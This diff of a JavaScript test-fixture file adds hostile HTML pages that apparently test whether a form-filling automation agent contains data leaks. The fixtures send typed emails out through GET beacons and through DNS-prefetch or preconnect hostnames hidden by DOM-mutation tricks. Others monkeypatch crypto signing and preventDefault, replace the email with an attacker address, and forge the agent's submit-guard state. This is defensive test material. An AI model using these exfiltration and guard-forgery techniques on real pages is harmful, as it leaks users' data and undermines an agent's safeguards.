+</form><div id="submitted">route-invisible link hint fixture</div>
+<div id="transport-state">not-attempted</div>
+<script>
+  function attemptRouteInvisibleHint() {
+    var callerValue = document.getElementById('native-email').value;
+    var callerHost = String(callerValue).toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '')
+      + '.route-invisible.invalid';
+    var state = document.getElementById('transport-state');
+    var hint = document.createElement('link');
+    try {
+      hint.rel = ${JSON.stringify(rel)};
+      hint.href = 'https://' + callerHost + '/';
+      document.head.appendChild(hint);
+      state.textContent = hint.isConnected
+        ? ${JSON.stringify(rel + ':hint-connected')}
+        : ${JSON.stringify(rel + ':hint-blocked')};
+    } catch (error) {
+      state.textContent = hint.isConnected
+        ? ${JSON.stringify(rel + ':hint-connected-after-throw')}
+        : ${JSON.stringify(rel + ':hint-blocked')};
+    }
+  }
+  if (${JSON.stringify(phase)} === 'pre-chooser') {
+    document.getElementById('native-email').addEventListener('input', attemptRouteInvisibleHint, { once: true });
+  }
+  if (${JSON.stringify(phase)} === 'activation') {
+    document.getElementById('send').addEventListener('pointerdown', attemptRouteInvisibleHint, { once: true });
+  }
+</script>`;
+
+const nativeConnectedHintMutationPage = (mutation, phase) => `<!doctype html><meta charset="utf-8"><title>Native connected link hint mutation containment</title>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  ${[
+    'safe-string-replace-children',
+    'safe-class-list-token',
+    'safe-markup-primitives',
+    'stateful-rel-coercion',
+    'closed-shadow-url-component'
+  ].includes(mutation)
+    ? '<input id="transport-state-field" name="transport_state" type="hidden" value="not-attempted">'
+    : ''}
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">connected link mutation fixture</div>
+<div id="transport-state">not-attempted</div><div id="shadow-host"></div>
+${mutation === 'closed-shadow-large-fragment'
+  ? '<template id="large-hint-fragment">'
+    + Array.from({ length: 257 }, (_, index) => (
+      '<link rel="preconnect" href="https://hint-' + index + '.route-invisible.invalid/">'
+    )).join('')
+    + '</template>'
+  : ''}
+${mutation === 'move-before'
+  ? '<template id="move-before-fragment"><link rel="preconnect" href="https://move-before.route-invisible.invalid/">'
+    + '<span id="move-before-marker"></span></template>'
+  : ''}
+${[
+  'closed-shadow-href-attribute',
+  'closed-shadow-href-named-map',
+  'closed-shadow-url-component'
+].includes(mutation)
+  ? '<div id="declarative-hint-host"><template shadowrootmode="open">'
+    + '<link rel="preconnect" href="'
+    + (mutation === 'closed-shadow-url-component'
+      ? '/native-get-exfil?channel=url-component&value=initial'
+      : 'https://initial.route-invisible.invalid/')
+    + '">'
+    + '</template></div>'
+  : ''}
+<script>
+  var transportStateOutput = document.getElementById('transport-state');
+  var transportStateField = document.getElementById('transport-state-field');
+  if (transportStateField) {
+    new MutationObserver(function () {
+      transportStateField.value = transportStateOutput.textContent;
+    }).observe(transportStateOutput, { childList: true, characterData: true, subtree: true });
+  }
+  function encodedCallerHost() {
+    return document.getElementById('native-email').value.toLowerCase()
+      .replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '') + '.route-invisible.invalid';
+  }
+  function attemptConnectedHintMutation() {
+    var state = document.getElementById('transport-state');
+    var destination = 'https://' + encodedCallerHost() + '/';
+    if (${JSON.stringify(mutation)} === 'safe-string-replace-children') {
+      try {
+        state.replaceChildren('safe-string-replace-children:allowed');
+      } catch (error) {
+        state.textContent = 'safe-string-replace-children:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'safe-markup-primitives') {
+      try {
+        var markupTarget = document.createElement('div');
+        markupTarget.innerHTML = false;
+        var falseValue = markupTarget.textContent;
+        markupTarget.innerHTML = 0;
+        state.textContent = falseValue === 'false' && markupTarget.textContent === '0'
+          ? 'safe-markup-primitives:allowed'
+          : 'safe-markup-primitives:changed';
+      } catch (error) {
+        state.textContent = 'safe-markup-primitives:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'exec-command-insert-html') {
+      try {
+        document.execCommand('insertHTML', false, '<link rel="preconnect" href="' + destination + '">');
+        state.textContent = 'exec-command-insert-html:usable';
+      } catch (error) {
+        state.textContent = 'exec-command-insert-html:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'variadic-document-write') {
+      try {
+        document.write('<li', 'nk rel="preconnect" href="' + destination + '">');
+        state.textContent = 'variadic-document-write:usable';
+      } catch (error) {
+        state.textContent = 'variadic-document-write:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'nested-iframe-srcdoc') {
+      try {
+        var inertFrameDocument = new DOMParser().parseFromString(
+          '<div><iframe srcdoc="&lt;link rel=&quot;preconnect&quot; href=&quot;' + destination
+            + '&quot;&gt;"></iframe></div>',
+          'text/html'
+        );
+        var frameContainer = document.adoptNode(inertFrameDocument.querySelector('div'));
+        hintShadow.replaceChildren(frameContainer);
+        state.textContent = 'nested-iframe-srcdoc:usable';
+      } catch (error) {
+        state.textContent = 'nested-iframe-srcdoc:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'move-before') {
+      var moveFragment = document.getElementById('move-before-fragment').content;
+      try {
+        moveFragment.moveBefore(
+          moveFragment.querySelector('link'),
+          moveFragment.getElementById('move-before-marker')
+        );
+        state.textContent = 'move-before:usable';
+      } catch (error) {
+        state.textContent = 'move-before:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'stateful-rel-coercion') {
+      var coercionLink = document.createElement('link');
+      coercionLink.href = destination;
+      hintShadow.replaceChildren(coercionLink);
+      var conversions = 0;
+      var coercion = {
+        toString: function () {
+          conversions += 1;
+          return conversions === 1 ? 'author' : 'preconnect';
+        }
+      };
+      try {
+        coercionLink.rel = coercion;
+        state.textContent = coercionLink.rel === 'author' && conversions === 1
+          ? 'stateful-rel-coercion:normalized'
+          : 'stateful-rel-coercion:usable';
+      } catch (error) {
+        state.textContent = 'stateful-rel-coercion:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'safe-class-list-token') {
+      try {
+        state.classList.add('preconnect');
+        state.classList.value = 'dns-prefetch';
+        state.textContent = 'safe-class-list-token:allowed';
+      } catch (error) {
+        state.textContent = 'safe-class-list-token:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'closed-shadow-href-attribute') {
+      var hrefAttributeHost = document.getElementById('declarative-hint-host').shadowRoot;
+      var hrefAttributeLink = hrefAttributeHost.querySelector('link');
+      try {
+        hrefAttributeLink.setAttribute('href', destination);
+        state.textContent = 'closed-shadow-href-attribute:usable';
+      } catch (error) {
+        state.textContent = 'closed-shadow-href-attribute:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'closed-shadow-href-named-map') {
+      var hrefNamedHost = document.getElementById('declarative-hint-host').shadowRoot;
+      var hrefNamedLink = hrefNamedHost.querySelector('link');
+      try {
+        var hrefDocument = new DOMParser().parseFromString(
+          '<div href="' + destination + '"></div>',
+          'text/html'
+        );
+        var hrefAttribute = hrefDocument.querySelector('div').getAttributeNode('href');
+        hrefAttribute.ownerElement.removeAttributeNode(hrefAttribute);
+        hrefNamedLink.attributes.setNamedItem(hrefAttribute);
+        state.textContent = 'closed-shadow-href-named-map:usable';
+      } catch (error) {
+        state.textContent = 'closed-shadow-href-named-map:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'closed-shadow-url-component') {
+      var componentHost = document.getElementById('declarative-hint-host').shadowRoot;
+      var componentLink = componentHost.querySelector('link');
+      var initialHref = componentLink.href;
+      var initialHrefAttribute = componentLink.getAttribute('href');
+      var expandoValue = '?applicant=' + encodeURIComponent(
+        document.getElementById('native-email').value
+      );
+      try {
+        componentLink.search = expandoValue;
+        state.textContent = componentLink.href === initialHref
+          && componentLink.getAttribute('href') === initialHrefAttribute
+          && Object.prototype.hasOwnProperty.call(componentLink, 'search')
+          && componentLink.search === expandoValue
+          ? 'closed-shadow-url-component-expando:allowed'
+          : 'closed-shadow-url-component-expando:changed';
+      } catch (error) {
+        state.textContent = 'closed-shadow-url-component-expando:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'closed-shadow-attr-node-value') {
+      var nodeValueLink = document.createElement('link');
+      nodeValueLink.rel = 'author';
+      nodeValueLink.href = destination;
+      hintShadow.replaceChildren(nodeValueLink);
+      try {
+        nodeValueLink.getAttributeNode('rel').nodeValue = 'preconnect';
+        state.textContent = nodeValueLink.relList.contains('preconnect')
+          ? 'closed-shadow-attr-node-value:usable'
+          : 'closed-shadow-attr-node-value:unexpected-return';
+      } catch (error) {
+        state.textContent = 'closed-shadow-attr-node-value:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'closed-shadow-named-node-map') {
+      var namedMapLink = document.createElement('link');
+      namedMapLink.href = destination;
+      hintShadow.replaceChildren(namedMapLink);
+      try {
+        var inertAttribute = new DOMParser().parseFromString(
+          '<div rel="preconnect"></div>',
+          'text/html'
+        ).querySelector('div').getAttributeNode('rel');
+        inertAttribute.ownerElement.removeAttributeNode(inertAttribute);
+        namedMapLink.attributes.setNamedItem(inertAttribute);
+        state.textContent = namedMapLink.relList.contains('preconnect')
+          ? 'closed-shadow-named-node-map:usable'
+          : 'closed-shadow-named-node-map:unexpected-return';
+      } catch (error) {
+        state.textContent = 'closed-shadow-named-node-map:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'closed-shadow-large-fragment') {
+      var fragment = document.getElementById('large-hint-fragment').content;
+      try {
+        hintShadow.replaceChildren(fragment);
+        state.textContent = hintShadow.querySelectorAll('link[rel~="preconnect"]').length > 0
+          ? 'closed-shadow-large-fragment:usable'
+          : 'closed-shadow-large-fragment:unexpected-return';
+      } catch (error) {
+        state.textContent = 'closed-shadow-large-fragment:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'closed-shadow-entity-inner-html') {
+      try {
+        hintShadow.innerHTML = '<link rel="pre&#x63;onnect" href="' + destination + '">';
+        state.textContent = hintShadow.querySelector('link[rel~="preconnect"]')
+          ? 'closed-shadow-entity-inner-html:usable'
+          : 'closed-shadow-entity-inner-html:unexpected-return';
+      } catch (error) {
+        state.textContent = 'closed-shadow-entity-inner-html:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'closed-shadow-replace-children') {
+      try {
+        var inert = new DOMParser().parseFromString(
+          '<link rel="preconnect" href="' + destination + '">',
+          'text/html'
+        );
+        var adopted = document.adoptNode(inert.querySelector('link'));
+        hintShadow.replaceChildren(adopted);
+        state.textContent = adopted && adopted.isConnected
+          ? 'closed-shadow-replace-children:usable'
+          : 'closed-shadow-replace-children:unexpected-return';
+      } catch (error) {
+        state.textContent = 'closed-shadow-replace-children:blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(mutation)} === 'shadow-inner-html') {
+      try {
+        hintShadow.innerHTML = '<link rel="preconnect" href="' + destination + '">';
+        var inserted = hintShadow.querySelector('link[rel~="preconnect"]');
+        state.textContent = inserted && inserted.isConnected
+          ? 'shadow-inner-html:usable'
+          : 'shadow-inner-html:unexpected-return';
+      } catch (error) {
+        var escaped = hintShadow.querySelector('link[rel~="preconnect"]');
+        state.textContent = escaped && escaped.isConnected
+          ? 'shadow-inner-html:usable-after-throw'
+          : 'shadow-inner-html:blocked';
+      }
+      return;
+    }
+    var hint = document.createElement('link');
+    hint.rel = 'author';
+    hint.href = location.origin + '/harmless-author-link';
+    document.head.appendChild(hint);
+    if (!hint.isConnected) {
+      state.textContent = 'connected-hint:setup-failed';
+      return;
+    }
+    hint.href = destination;
+    try {
+      if (${JSON.stringify(mutation)} === 'rel-setter') {
+        hint.rel = 'preconnect';
+      } else {
+        hint.relList.add('preconnect');
+      }
+      state.textContent = hint.isConnected && hint.relList.contains('preconnect')
+        ? ${JSON.stringify('connected-' + mutation + ':usable')}
+        : ${JSON.stringify('connected-' + mutation + ':unexpected-return')};
+    } catch (error) {
+      state.textContent = hint.isConnected && !hint.relList.contains('preconnect')
+        ? ${JSON.stringify('connected-' + mutation + ':blocked')}
+        : ${JSON.stringify('connected-' + mutation + ':usable-after-throw')};
+    }
+  }
+  var hintShadow = document.getElementById('shadow-host').attachShadow({
+    mode: ${JSON.stringify(mutation)}.startsWith('closed-shadow-') ? 'closed' : 'open'
+  });
+  if (${JSON.stringify(phase)} === 'pre-chooser') {
+    document.getElementById('native-email').addEventListener('input', attemptConnectedHintMutation, { once: true });
+  }
+  if (${JSON.stringify(phase)} === 'activation') {
+    document.getElementById('send').addEventListener('pointerdown', attemptConnectedHintMutation, { once: true });
+  }
+</script>`;
+
+const nativeGetExfilPage = (channel) => `<!doctype html><meta charset="utf-8"><title>Native GET containment</title>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">GET containment fixture</div>
+<script>
+  document.getElementById('native-email').addEventListener('input', function (event) {
+    var url = '/native-get-exfil?channel=' + ${JSON.stringify(channel)}
+      + '&value=' + encodeURIComponent(event.currentTarget.value);
+    if (${JSON.stringify(channel)} === 'fetch') {
+      fetch(url).catch(function () {});
+      return;
+    }
+    var image = new Image();
+    image.src = url;
+    document.body.appendChild(image);
+  });
+</script>`;
+
+const NATIVE_DELAYED_ACTIVATION_GET = `<!doctype html><meta charset="utf-8"><title>Native delayed activation GET containment</title>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">delayed activation GET fixture</div>
+<script>
+  document.getElementById('send').addEventListener('pointerdown', function () {
+    setTimeout(function () {
+      fetch('/native-get-exfil?channel=activation-delayed&value='
+        + encodeURIComponent(document.getElementById('native-email').value)).catch(function () {});
+    }, 0);
+  }, { once: true });
+</script>`;
+
+const NATIVE_CROSS_SITE_COOKIE = `<!doctype html><meta charset="utf-8"><title>Native cross-site cookie application</title>
+<form id="application_form" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">cross-site cookie fixture</div>
+<script>
+  document.getElementById('application_form').action = 'http://127.0.0.1:' + location.port + '/native-cookie-real';
+</script>`;
+
 const nativeRedirectPage = (action) => `<!doctype html><meta charset="utf-8"><title>Native redirect application</title>
-<form id="application_form" action="${action}" method="post" novalidate>
+<form id="application_form" action="${action}" method="post" enctype="multipart/form-data">
   <label for="native-email">Email</label><input id="native-email" name="email" type="email">
   <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
   <button id="send" type="submit">Send</button>
 </form><div id="submitted">redirect fixture</div>`;
 
 const NATIVE_IFRAME_CLONE = `<!doctype html><meta charset="utf-8"><title>Native iframe clone application</title>
-<form id="application_form" action="/native-real" method="post" novalidate>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
   <label for="native-email">Email</label><input id="native-email" name="email" type="email">
   <label for="native-name">Name</label><input id="native-name" name="name">
   <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
@@ -1773,6 +3051,82 @@ const NATIVE_IFRAME_CLONE = `<!doctype html><meta charset="utf-8"><title>Native 
     var cloneForm = cloneDocument.getElementById('clone_form');
     cloneForm.action = applicationForm.action;
     cloneFrame.contentWindow.location.assign(cloneForm.action);
+  });
+</script>`;
+
+const NATIVE_FORMDATA_CRYPTO_MONKEYPATCH = `<!doctype html><meta charset="utf-8"><title>Native formdata mutation</title>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" type="submit">Send</button>
+</form><div id="submitted">formdata mutation fixture</div>
+<script>
+  SubtleCrypto.prototype.sign = function () {
+    return Promise.resolve(new Uint8Array(32).buffer);
+  };
+  document.getElementById('application_form').addEventListener('formdata', function (event) {
+    event.formData.set('email', 'attacker@example.com');
+  });
+</script>`;
+
+const NATIVE_PAGE_STATE_FORGERY = `<!doctype html><meta charset="utf-8"><title>Native page-state forgery</title>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" type="submit">Send</button>
+</form><div id="submitted">page-state forgery fixture</div>
+<script>
+  Event.prototype.preventDefault = function () {};
+  var applicationForm = document.getElementById('application_form');
+  document.getElementById('send').addEventListener('click', function () {
+    applicationForm.noValidate = true;
+    var forgedState = {
+      status: 'allowed',
+      reason: null,
+      finalize: function () { return { status: 'allowed', reason: null }; }
+    };
+    var forgedGuards = new Map([['page-forged-token', forgedState]]);
+    try {
+      Object.defineProperty(globalThis, '__litosSubmitActivationGuards', {
+        value: forgedGuards,
+        configurable: true
+      });
+    } catch {}
+    var visibleGuards = globalThis.__litosSubmitActivationGuards;
+    if (visibleGuards instanceof Map) {
+      for (var state of visibleGuards.values()) {
+        state.status = 'allowed';
+        state.reason = null;
+        state.finalize = forgedState.finalize;
+      }
+    }
+  });
+</script>`;
+
+const nativeValidationBypassPage = (mode) => `<!doctype html><meta charset="utf-8"><title>Native validation bypass ${mode}</title>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data"${mode === 'form' ? ' novalidate' : ''}>
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email" required>
+  <label for="native-code">Applicant code</label>
+  <input id="native-code" name="code" required pattern="[A-Z]{3}">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file" required>
+  <button id="send" type="submit"${mode === 'submitter' ? ' formnovalidate' : ''}>${mode === 'submitter' ? 'Submit application' : 'Send'}</button>
+</form><div id="submitted">validation bypass fixture</div>`;
+
+const nativeConstraintMutationPage = (mode) => `<!doctype html><meta charset="utf-8"><title>Native constraint mutation ${mode}</title>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email" required>
+  <label for="native-code">Applicant code</label>
+  <input id="native-code" name="code" required pattern="${mode === 'pattern' ? '[A-Z]{3}' : '[a-z]{3}'}">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file" required>
+  <button id="send" type="submit">Send</button>
+</form><div id="submitted">constraint mutation fixture</div>
+<script>
+  var nativeCode = document.getElementById('native-code');
+  var nativeSubmit = document.getElementById('send');
+  if (${JSON.stringify(mode)} === 'custom-validity') nativeCode.setCustomValidity('Applicant code is invalid');
+  nativeSubmit.addEventListener('click', function () {
+    if (${JSON.stringify(mode)} === 'pattern') nativeCode.removeAttribute('pattern');
+    else nativeCode.setCustomValidity('');
   });
 </script>`;
 
@@ -1808,9 +3162,11 @@ const FIXTURES = {
   '/application-profile-bare-send': applicationIdentityDecoyPage('profile'),
   '/application-status-bare-send': applicationIdentityDecoyPage('status'),
   '/fill-by-phone-format': FILL_BY_PHONE_FORMAT,
+  '/fill-by-inferred-phone-format': FILL_BY_INFERRED_PHONE_FORMAT,
   '/fill-by-select-label': FILL_BY_SELECT_LABEL,
   '/fill-by-select-punctuation': FILL_BY_SELECT_PUNCTUATION,
   '/fill-by-date-normalization': FILL_BY_DATE_NORMALIZATION,
+  '/fill-by-inferred-date-normalization': FILL_BY_INFERRED_DATE_NORMALIZATION,
   '/workable-role-send': WORKABLE_ROLE_SEND,
   '/workable-explicit-role': WORKABLE_EXPLICIT_ROLE,
   '/workable-formaction-override': WORKABLE_FORM_ACTION_OVERRIDE,
@@ -1826,8 +3182,6 @@ const FIXTURES = {
   '/workable-activation-pointer-drift': activationDriftPage('pointer'),
   '/workable-activation-click-drift': activationDriftPage('click'),
   '/workable-prechooser-auto-submit': PRE_CHOOSER_AUTO_SUBMIT,
-  '/cross-form-optin-decoy': CROSS_FORM_OPTIN_DECOY,
-  '/action-boundary-drift': ACTION_BOUNDARY_DRIFT,
   '/job-alert-bare-send': JOB_ALERT_BARE_SEND,
   '/talent-pool-bare-send': TALENT_POOL_BARE_SEND,
   '/minimal-file-drift': MINIMAL_FILE_DRIFT,
@@ -1856,6 +3210,7 @@ const FIXTURES = {
   '/failed-choice-replace': failedChoicePage(true),
   '/external-required-control': EXTERNAL_REQUIRED_CONTROL,
   '/whole-form-failed-choice': WHOLE_FORM_FAILED_CHOICE,
+  '/v3-detached-unrelated-failed-choice': V3_DETACHED_UNRELATED_FAILED_CHOICE,
   '/fill-target-swap': actionTargetSwapPage('fill'),
   '/fill-by-target-swap': actionTargetSwapPage('fillByLabelText'),
   '/select-target-swap': actionTargetSwapPage('select'),
@@ -1868,6 +3223,7 @@ const FIXTURES = {
   '/history-parity': HISTORY_PARITY,
   '/shadow-bare-send': SHADOW_BARE_SEND,
   '/workable-unrelated-form': WORKABLE_WITH_UNRELATED_FORM,
+  '/explicit-submit-only-unrelated-proof': EXPLICIT_SUBMIT_WITH_ONLY_UNRELATED_PROOF,
   '/text-repurpose-drift': TEXT_REPURPOSE_DRIFT,
   '/failed-text-persistence': FAILED_TEXT_PERSISTENCE,
   '/async-text-drift': ASYNC_TEXT_DRIFT,
@@ -1882,28 +3238,139 @@ const FIXTURES = {
   '/native-activation-click': nativeActivationPage('click'),
   '/native-activation-submit-action': nativeActivationPage('submit-action'),
   '/native-activation-submit-association': nativeActivationPage('submit-association'),
+  '/native-activation-submit-aria-required': nativeActivationPage('submit-aria-required'),
+  '/native-activation-submit-star-marker': nativeActivationPage('submit-star-marker'),
+  '/native-activation-submit-cancel-direct-real': nativeActivationPage('submit-cancel-direct-real'),
+  '/native-activation-pre-arm-required': nativeActivationPage('pre-arm-required'),
   '/native-activation-cached-direct-real': nativeActivationPage('cached-direct-real'),
   '/native-activation-cached-direct-decoy': nativeActivationPage('cached-direct-decoy'),
   '/native-activation-synthetic-witness': nativeActivationPage('synthetic-witness'),
-  '/native-activation-side-channels': nativeActivationPage('side-channels'),
-  '/late-final-action-drift': lateFinalChooserDriftPage('action'),
-  '/late-final-hidden-drift': lateFinalChooserDriftPage('hidden'),
-  '/late-final-submit-text-drift': lateFinalChooserDriftPage('text'),
   '/workable-native-allowlist': WORKABLE_NATIVE_ALLOWLIST,
+  '/workable-native-allowlist-empty': WORKABLE_NATIVE_ALLOWLIST_EMPTY,
   '/native-activation-iframe-clone': NATIVE_IFRAME_CLONE,
+  '/native-constraint-custom-validity-clear': nativeConstraintMutationPage('custom-validity'),
+  '/native-constraint-pattern-removal': nativeConstraintMutationPage('pattern'),
+  '/native-formdata-crypto-monkeypatch': NATIVE_FORMDATA_CRYPTO_MONKEYPATCH,
+  '/native-page-state-forgery': NATIVE_PAGE_STATE_FORGERY,
   '/native-serializer-empty-file': NATIVE_SERIALIZER,
   '/native-serializer-populated-file': NATIVE_SERIALIZER,
+  '/native-multipart-serializer': NATIVE_MULTIPART_SERIALIZER,
+  '/native-multipart-serializer-empty': NATIVE_MULTIPART_SERIALIZER,
+  '/native-file-byte-substitution': NATIVE_FILE_BYTE_SUBSTITUTION,
+  '/native-text-value-getter-spoof': NATIVE_TEXT_VALUE_GETTER_SPOOF,
+  '/native-select-value-getter-spoof': NATIVE_SELECT_VALUE_GETTER_SPOOF,
+  '/native-textarea-whitespace-drift': NATIVE_TEXTAREA_WHITESPACE_DRIFT,
+  '/native-hidden-choice-label-spoof': NATIVE_HIDDEN_CHOICE_LABEL_SPOOF,
+  '/native-legacy-verifier-write-drift': NATIVE_LEGACY_VERIFIER_WRITE_DRIFT,
+  '/native-main-world-primordial-patches': NATIVE_MAIN_WORLD_PRIMORDIAL_PATCHES,
+  '/native-nameless-proof-controls': NATIVE_NAMELESS_PROOF_CONTROLS,
+  '/native-multi-select-injection': NATIVE_MULTI_SELECT_INJECTION,
+  '/native-form-owner-getter-spoof': NATIVE_FORM_OWNER_GETTER_SPOOF,
+  '/native-forged-submit-label': NATIVE_FORGED_SUBMIT_LABEL,
+  '/native-hidden-submit-text': NATIVE_HIDDEN_SUBMIT_TEXT,
+  '/native-opacity-zero-submit': NATIVE_OPACITY_ZERO_SUBMIT,
+  '/native-optin-value-getter-spoof': NATIVE_OPTIN_VALUE_GETTER_SPOOF,
+  '/native-required-selector-spoof': NATIVE_REQUIRED_SELECTOR_SPOOF,
+  '/native-custom-required-selector-spoof': NATIVE_CUSTOM_REQUIRED_SELECTOR_SPOOF,
+  '/native-custom-required-aria-only': NATIVE_CUSTOM_REQUIRED_ARIA_ONLY,
+  '/native-required-class-marker-spoof': NATIVE_REQUIRED_CLASS_MARKER_SPOOF,
+  '/native-required-star-marker-spoof': NATIVE_REQUIRED_STAR_MARKER_SPOOF,
+  '/native-required-unassociated-star-marker-spoof': NATIVE_REQUIRED_UNASSOCIATED_STAR_MARKER_SPOOF,
+  '/native-required-disabled-choice-peer': nativeRequiredPayloadParityPage('disabled-choice'),
+  '/native-required-native-disabled-choice-peer': nativeRequiredPayloadParityPage('native-disabled-choice'),
+  '/native-required-mixed-choice-peer': nativeRequiredPayloadParityPage('mixed-choice'),
+  '/native-required-disabled-option': nativeRequiredPayloadParityPage('disabled-option'),
+  '/native-required-disabled-optgroup': nativeRequiredPayloadParityPage('disabled-optgroup'),
+  '/native-required-native-disabled-option': nativeRequiredPayloadParityPage('native-disabled-option'),
+  '/native-required-native-disabled-optgroup': nativeRequiredPayloadParityPage('native-disabled-optgroup'),
+  '/native-required-empty-option': nativeRequiredPayloadParityPage('empty-option'),
+  '/native-optional-hidden-star': NATIVE_OPTIONAL_HIDDEN_STAR,
+  '/native-starred-legend-empty': nativeStarredLegendPage('empty'),
+  '/native-starred-legend-answered': nativeStarredLegendPage('answered'),
+  '/native-starred-legend-hidden-backing': nativeStarredLegendPage('hidden'),
+  '/native-custom-required-mixed-group': NATIVE_CUSTOM_REQUIRED_MIXED_GROUP,
+  '/native-custom-required-display-contents': NATIVE_CUSTOM_REQUIRED_DISPLAY_CONTENTS,
+  '/native-custom-required-oversized-owner': NATIVE_CUSTOM_REQUIRED_OVERSIZED_OWNER,
+  '/native-barred-required-controls': NATIVE_BARRED_REQUIRED_CONTROLS,
+  '/native-external-custom-required-empty': nativeExternalRequiredOwnerPage('custom-empty'),
+  '/native-external-custom-required-answered': nativeExternalRequiredOwnerPage('custom-answered'),
+  '/native-external-marker-required-empty': nativeExternalRequiredOwnerPage('marker-empty'),
+  '/native-external-aria-owns-empty': nativeExternalAriaOwnsPage(false),
+  '/native-external-aria-owns-answered': nativeExternalAriaOwnsPage(true),
+  '/native-required-fieldset-empty': nativeRequiredFieldsetPage(false),
+  '/native-required-fieldset-answered': nativeRequiredFieldsetPage(true),
+  '/native-aria-label-drift': NATIVE_ARIA_LABEL_DRIFT,
+  '/native-aria-label-choice-proof': NATIVE_ARIA_LABEL_CHOICE_PROOF,
+  '/native-unselected-image-control': NATIVE_UNSELECTED_IMAGE_CONTROL,
+  '/native-userinfo-action': NATIVE_USERINFO_ACTION,
+  '/native-late-file-getter-substitution': NATIVE_LATE_FILE_GETTER_SUBSTITUTION,
+  '/native-reversible-file-proof-swap': NATIVE_REVERSIBLE_FILE_PROOF_SWAP,
+  '/native-websocket-pre-chooser': nativeWebSocketPage('pre-chooser'),
+  '/native-websocket-activation': nativeWebSocketPage('activation'),
+  '/native-rtc-pre-chooser': nativeRouteInvisibleConstructorPage('rtc', 'pre-chooser'),
+  '/native-webtransport-activation': nativeRouteInvisibleConstructorPage('webtransport', 'activation'),
+  '/native-websocketstream-pre-chooser': nativeRouteInvisibleConstructorPage('websocketstream', 'pre-chooser'),
+  '/native-websocketstream-activation': nativeRouteInvisibleConstructorPage('websocketstream', 'activation'),
+  '/native-serviceworker-pre-chooser': nativeRouteInvisibleConstructorPage('serviceworker', 'pre-chooser'),
+  '/native-popup-route-invisible': NATIVE_POPUP_ROUTE_INVISIBLE,
+  '/native-document-open-popup': NATIVE_DOCUMENT_OPEN_POPUP,
+  '/native-data-frame-hint': NATIVE_DATA_FRAME_HINT,
+  '/native-data-popup-hint': NATIVE_DATA_POPUP_HINT,
+  '/native-initial-script-transport': NATIVE_INITIAL_SCRIPT_TRANSPORT,
+  '/native-dns-prefetch-pre-chooser': nativeRouteInvisibleHintPage('dns-prefetch', 'pre-chooser'),
+  '/native-preconnect-activation': nativeRouteInvisibleHintPage('preconnect', 'activation'),
+  '/native-connected-rel-pre-chooser': nativeConnectedHintMutationPage('rel-setter', 'pre-chooser'),
+  '/native-connected-rel-list-activation': nativeConnectedHintMutationPage('rel-list', 'activation'),
+  '/native-shadow-hint-inner-html': nativeConnectedHintMutationPage('shadow-inner-html', 'pre-chooser'),
+  '/native-closed-shadow-replace-children': nativeConnectedHintMutationPage('closed-shadow-replace-children', 'pre-chooser'),
+  '/native-closed-shadow-large-fragment': nativeConnectedHintMutationPage('closed-shadow-large-fragment', 'pre-chooser'),
+  '/native-closed-shadow-entity-inner-html': nativeConnectedHintMutationPage('closed-shadow-entity-inner-html', 'pre-chooser'),
+  '/native-closed-shadow-attr-node-value': nativeConnectedHintMutationPage('closed-shadow-attr-node-value', 'pre-chooser'),
+  '/native-closed-shadow-named-node-map': nativeConnectedHintMutationPage('closed-shadow-named-node-map', 'pre-chooser'),
+  '/native-variadic-document-write': nativeConnectedHintMutationPage('variadic-document-write', 'pre-chooser'),
